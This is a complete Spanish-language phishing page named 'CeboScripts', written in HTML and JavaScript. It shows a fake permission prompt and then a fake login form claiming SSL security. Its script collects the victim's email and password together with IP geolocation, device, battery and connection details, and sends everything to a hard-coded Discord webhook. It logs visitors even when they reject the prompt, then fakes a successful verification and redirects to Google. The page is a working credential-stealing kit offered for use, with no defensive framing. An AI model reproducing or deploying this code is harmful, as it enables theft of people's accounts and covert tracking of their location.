<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CeboScripts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        /* OVERLAY DE PERMISO */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.92);
            backdrop-filter: blur(8px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .modal {
            background: #0a0a0a;
            border: 2px solid #ff0000;
            border-radius: 15px;
            padding: 40px 50px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 0 50px rgba(255,0,0,0.3);
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 20px rgba(255,0,0,0.2); }
            100% { box-shadow: 0 0 60px rgba(255,0,0,0.6); }
        }
        .modal h2 {
            color: #ff0000;
            font-size: 1.8em;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255,0,0,0.5);
        }
        .modal p {
            color: #aaa;
            font-size: 0.95em;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .modal .icon {
            font-size: 3em;
            margin-bottom: 15px;
            display: block;
        }
        .btn-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .btn {
            padding: 12px 40px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 120px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-accept {
            background: #ff0000;
            color: #fff;
            border: 1px solid #ff0000;
        }
        .btn-accept:hover {
            background: #cc0000;
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255,0,0,0.6);
        }
        .btn-reject {
            background: transparent;
            color: #fff;
            border: 1px solid #555;
        }
        .btn-reject:hover {
            background: #222;
            border-color: #ff0000;
            transform: scale(1.05);
        }
        .hidden {
            display: none !important;
        }

        /* FORMULARIO FALSO */
        .login-container {
            background: #0a0a0a;
            border: 2px solid #333;
            border-radius: 15px;
            padding: 40px 50px;
            max-width: 420px;
            width: 90%;
            text-align: center;
            box-shadow: 0 0 40px rgba(255,0,0,0.15);
        }
        .login-container h2 {
            color: #fff;
            font-size: 1.8em;
            margin-bottom: 5px;
        }
        .login-container .sub {
            color: #888;
            font-size: 0.9em;
            margin-bottom: 25px;
        }
        .login-container .logo {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .input-group label {
            color: #aaa;
            font-size: 0.85em;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 1em;
            transition: all 0.3s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #ff0000;
            box-shadow: 0 0 20px rgba(255,0,0,0.15);
        }
        .input-group input::placeholder {
            color: #555;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #ff0000;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-login:hover {
            background: #cc0000;
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255,0,0,0.4);
        }
        .btn-login:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .status-msg {
            margin-top: 15px;
            color: #ff4444;
            font-size: 0.85em;
            min-height: 20px;
        }
        .footer-text {
            margin-top: 20px;
            color: #444;
            font-size: 0.7em;
        }
        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- ====== OVERLAY DE PERMISO ====== -->
    <div class="overlay" id="permissionOverlay">
        <div class="modal">
            <span class="icon">⚠️</span>
            <h2>PERMISO REQUERIDO</h2>
            <p>
                Este sitio necesita acceder a tu información<br>
                para continuar. ¿Aceptas?
            </p>
            <div class="btn-group">
                <button class="btn btn-accept" id="btnAccept">ACEPTAR</button>
                <button class="btn btn-reject" id="btnReject">RECHAZAR</button>
            </div>
        </div>
    </div>

    <!-- ====== FORMULARIO FALSO (se muestra después de aceptar) ====== -->
    <div class="login-container hidden" id="loginForm">
        <div class="logo">🔐</div>
        <h2>Iniciar Sesión</h2>
        <p class="sub">Verificación de seguridad requerida</p>

        <div class="input-group">
            <label>📧 Correo Electrónico</label>
            <input type="email" id="emailInput" placeholder="ejemplo@correo.com" autocomplete="off">
        </div>

        <div class="input-group">
            <label>🔑 Contraseña</label>
            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
        </div>

        <button class="btn-login" id="btnLogin">Verificar Identidad</button>
        <div class="status-msg" id="loginStatus"></div>
        <div class="footer-text">Tus datos están seguros • Verificación SSL</div>
    </div>

    <script>
        // ======== CONFIGURACIÓN ========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";

        // ======== OBTENER DATOS DEL DISPOSITIVO ========
        async function getDeviceData() {
            const data = {};

            // 1. IP y ubicación
            try {
                const res = await fetch('https://ipapi.co/json/');
                const ipData = await res.json();
                data.ip = ipData.ip || 'No disponible';
                data.ciudad = ipData.city || 'No disponible';
                data.pais = ipData.country_name || 'No disponible';
                data.proveedor = ipData.org || 'No disponible';
                data.region = ipData.region || 'No disponible';
                data.isp = ipData.org || 'No disponible';
            } catch (e) {
                data.ip = 'Error';
                data.ciudad = 'Error';
                data.pais = 'Error';
                data.proveedor = 'Error';
                data.region = 'Error';
                data.isp = 'Error';
            }

            // 2. Dispositivo
            const ua = navigator.userAgent || '';
            if (/android/i.test(ua)) data.dispositivo = 'Android';
            else if (/iphone|ipad|ipod/i.test(ua)) data.dispositivo = 'iOS';
            else if (/windows/i.test(ua)) data.dispositivo = 'Windows PC';
            else if (/mac/i.test(ua)) data.dispositivo = 'Mac';
            else if (/linux/i.test(ua)) data.dispositivo = 'Linux';
            else data.dispositivo = 'Desconocido';

            // 3. Batería
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.bateria = Math.round(battery.level * 100) + '%';
                    data.cargando = battery.charging ? 'Sí' : 'No';
                } else {
                    data.bateria = 'No disponible';
                    data.cargando = 'No disponible';
                }
            } catch (e) {
                data.bateria = 'No disponible';
                data.cargando = 'No disponible';
            }

            // 4. Conexión
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    data.tipoConexion = conn.effectiveType || 'No disponible';
                } else {
                    data.tipoConexion = 'No disponible';
                }
            } catch (e) {
                data.tipoConexion = 'No disponible';
            }

            data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
            data.hora = new Date().toLocaleString();
            data.userAgent = ua;
            data.referrer = document.referrer || 'Directo';

            return data;
        }

        // ======== ENVIAR A DISCORD ========
        async function sendToDiscord(data, email, password, accion) {
            const embed = {
                color: 0xff0000,
                title: '🔴 CeboScripts - CREDENCIALES CAPTURADAS',
                fields: [
                    { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
                    { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
                    { name: '🏙️ Ciudad', value: data.ciudad || 'No disponible', inline: true },
                    { name: '🌍 País', value: data.pais || 'No disponible', inline: true },
                    { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
                    { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
                    { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
                    { name: '📧 CORREO', value: email || 'No capturado', inline: false },
                    { name: '🔑 CONTRASEÑA', value: password || 'No capturada', inline: false },
                    { name: '⚡ Acción', value: accion, inline: true },
                    { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false },
                    { name: '💻 User-Agent', value: (data.userAgent || '').substring(0, 200), inline: false }
                ],
                footer: {
                    text: 'CeboScripts • Credenciales robadas'
                },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts Logger',
                        content: '📢 **¡NUEVAS CREDENCIALES!**',
                        embeds: [embed]
                    })
                });
                console.log('✅ Enviado a Discord');
            } catch (e) {
                console.error('❌ Error al enviar:', e);
            }
        }

        // ======== MANEJAR BOTÓN ACEPTAR ========
        document.getElementById('btnAccept').addEventListener('click', async function() {
            // Ocultar overlay de permiso
            document.getElementById('permissionOverlay').classList.add('hidden');
            // Mostrar formulario falso
            document.getElementById('loginForm').classList.remove('hidden');

            // Obtener datos del dispositivo (para enviar después)
            window.deviceData = await getDeviceData();
            console.log('✅ Datos de dispositivo capturados');
        });

        // ======== MANEJAR BOTÓN RECHAZAR ========
        document.getElementById('btnReject').addEventListener('click', async function() {
            // También envía datos aunque rechace
            const data = await getDeviceData();
            await sendToDiscord(data, 'No capturado', 'No capturado', 'Rechazó permiso');

            // Mostrar mensaje de error y ocultar overlay
            document.getElementById('permissionOverlay').classList.add('hidden');
            document.body.innerHTML = `
                <div style="text-align:center;padding:40px;color:#ff0000;">
                    <h1>🚫 ACCESO DENEGADO</h1>
                    <p style="color:#888;">Has sido registrado de todos modos.</p>
                </div>
            `;
        });

        // ======== MANEJAR ENVÍO DEL FORMULARIO ========
        document.getElementById('btnLogin').addEventListener('click', async function() {
            const email = document.getElementById('emailInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusMsg = document.getElementById('loginStatus');

            // Validar campos
            if (!email || !password) {
                statusMsg.textContent = '⚠️ Por favor, completa todos los campos.';
                statusMsg.style.color = '#ff4444';
                return;
            }

            // Deshabilitar botón
            this.disabled = true;
            this.innerHTML = '<span class="loading-spinner"></span> Verificando...';
            statusMsg.textContent = '';

            // Enviar a Discord
            const data = window.deviceData || await getDeviceData();
            await sendToDiscord(data, email, password, 'Envió credenciales');

            // Mostrar éxito falso
            statusMsg.textContent = '✅ ¡Verificación exitosa! Redirigiendo...';
            statusMsg.style.color = '#00ff00';
            this.innerHTML = '✅ Verificado';

            // Redirigir a una página real (opcional)
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        });

        // ======== ENTER PARA ENVIAR ========
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const btn = document.getElementById('btnLogin');
                if (!btn.disabled) btn.click();
            }
        });
    </script>
</body>
</html>
